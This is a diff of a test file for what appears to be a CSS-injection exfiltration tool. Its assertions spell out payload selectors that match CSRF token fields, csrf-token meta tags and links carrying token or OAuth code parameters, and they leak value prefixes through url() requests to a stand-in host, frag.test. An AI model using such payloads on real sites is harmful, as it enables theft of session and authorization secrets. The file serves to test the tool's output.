@@ -96,11 +96,11 @@ test('rendered CSS has exactly one declaration per rule, with the expected selec
   const css = B.render(reconData, 'http://frag.test');
   assert.equal(css.match(/\{--[\w-]+:url\(/g).length, reconData.rules.length);
   assert.ok(css.startsWith('<style>head,meta{display:block}'));
-  assert.ok(css.includes('html:has(input[name="csrf" i]){--ra:url(http://frag.test/r/i/csrf)}'));
-  assert.ok(css.includes('form:has(>input[name="csrf" i]){--rb:url(http://frag.test/r/if/csrf)}'));
-  assert.ok(css.includes('html:has(input[name="csrf" i][value]:not([value=""],[value*="g" i],'));
+  assert.ok(css.includes('html:has(input[name=csrf i]){--r-a:url(http://frag.test/r/i/csrf),}'));
+  assert.ok(css.includes('form:has(>input[name=csrf i]){--r-b:url(http://frag.test/r/if/csrf),}'));
+  assert.ok(css.includes('html:has(input[name=csrf i][value]:not([value=""],[value*=g i],'));
   assert.ok(css.includes('a:is([href*="?token=" i],[href*="&token=" i]){'));
-  assert.ok(css.includes('meta:is([name="csrf-token" i][content]){--'));
+  assert.ok(css.includes('meta:is([name=csrf-token i][content]){--'));
 
   const fields = [
     { id: 0, kind: 'input', name: 'csrf', host: 'form', windowSize: 3 },
@@ -110,11 +110,12 @@ test('rendered CSS has exactly one declaration per rule, with the expected selec
   const extract = B.extractPayload(fields);
   const out = B.generateBlindCSS(fields, 'http://frag.test');
   assert.equal(out.match(/\{--[\w-]+:url\(/g).length, extract.rules.length);
-  assert.ok(out.includes('form:has(>input[name="csrf" i][value^="00"]){--s0-:url(http://frag.test/b/0/s/00)}'));
+  assert.ok(out.includes('input:is([name=csrf i]){form:has(>&[value^="00"]){--s0-:url(http://frag.test/b/0/s/00),}'));
   // Self-hosted rules keep their attribute tests inside :is() (much faster
   // for Chrome to build).
-  assert.ok(out.includes('a:is([href*="?code=ab" i]){--s2-:url(http://frag.test/b/2/s/ab)}'));
-  assert.ok(out.includes('a:is([href*="code=" i][href*="ab&"]){--e2-ab:url(http://frag.test/b/2/e/ab)}'));
+  assert.ok(out.includes('a:is([href*="code=" i]){&:is([href*="?code=00" i])'));
+  assert.ok(out.includes('&:is([href*="?code=ab" i]){--s2-:url(http://frag.test/b/2/s/ab),}'));
+  assert.ok(out.includes('&:is([href*="ab&"]){--e2-ab:url(http://frag.test/b/2/e/ab),}'));
   // Both form fields share one `background` on the form.
   assert.equal(out.match(/(^|\})form\{background:/g).length, 1);
   // 4-char windows need the pseudo-elements too.
@@ -315,6 +316,10 @@ test('payloads too big for one stylesheet are split below Chrome\'s 2^18 rule li
   const css = B.generateBlindCSS(fields, 'http://frag.test');
   const sheets = css.split('</style><style>');
   assert.equal(sheets.length, 2);
-  for (const sheet of sheets) assert.ok(sheet.match(/\{/g).length < 2 ** 18);
+  for (const sheet of sheets) {
+    assert.ok(sheet.match(/\{/g).length <= 250000);
+    assert.equal(sheet.match(/\{/g).length, sheet.match(/\}/g).length, 'nesting closes within each sheet');
+  }
+  assert.ok(sheets[1].startsWith('a:is([href*="code=" i]){&:is('), 'split field reopens its selector');
   assert.equal(css.match(/\{--[\w-]+:url\(/g).length, B.extractPayload(fields).rules.length);
 });
